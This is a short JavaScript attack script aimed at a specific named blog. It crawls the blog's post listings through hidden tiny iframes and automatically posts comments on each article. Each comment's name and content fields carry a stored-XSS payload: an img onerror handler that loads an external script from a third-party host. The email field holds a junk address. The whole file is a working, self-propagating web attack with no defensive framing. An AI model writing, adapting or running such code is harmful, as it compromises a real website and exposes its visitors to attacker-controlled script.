(function(){
	function atatck(doc) {
		var shellcode="<img src='x' onerror=document.body.appendChild(document.createElement('script')).src='https://cgoxopx.github.io/xss.js' ";
		var err;
		function subm(){
			var em=doc.getElementById("comment_submit_button");
			try{
				em.click();
			}catch (err) {
			}
		}
		
		function setName() {
			var em=doc.getElementsByName("name")[0];
			try{
				em.value=shellcode;
			}catch (err) {
			}
		}
		
		function setMail() {
			var em=doc.getElementsByName("email")[0];
			try{
				em.value="12345@fuck.com";
			}catch (err) {
			}
		}
		
		function setContent() {
			var em=doc.getElementsByName("content")[0];
			try{
				em.value=shellcode+"<!--";
			}catch (err) {
			}
		}
		
		function sendPost() {
			try {
				setName();
				setMail();
				setContent();
				subm();
			}catch (err) {
			}
		}
		sendPost();
	}
	function getPageURL(p) {
		return "https://blog.xtlsoft.top/list/"+p+".html"
	}
	function getPageLinks(p) {
		var pu=getPageURL(p);
		var ifm=document.body.appendChild(document.createElement('iframe'));
		ifm.onload=function () {
			try {
				var dms=ifm.contentWindow.document.getElementsByTagName("a");
				for (var i=0;i<dms.length;i++) {
					if(dms[i].innerHTML=="继续阅读")
						doAttackActivity(dms[i].href);
				}
			}catch (err) {
				
			}
		};
		ifm.src=pu;
		ifm.height=4;
		ifm.width=4;
	}
	function doAttackActivity(u) {
		var ifm=document.body.appendChild(document.createElement('iframe'));
		ifm.onload=function () {
			try {
				atatck(ifm.contentWindow.document);
			}catch (err) {
				
			}
		};
		ifm.src=u;
		ifm.height=4;
		ifm.width=4;
	}
	for(var j=5;j>=0;j--)
		getPageLinks(j);
	//atatck(document);
	
})();
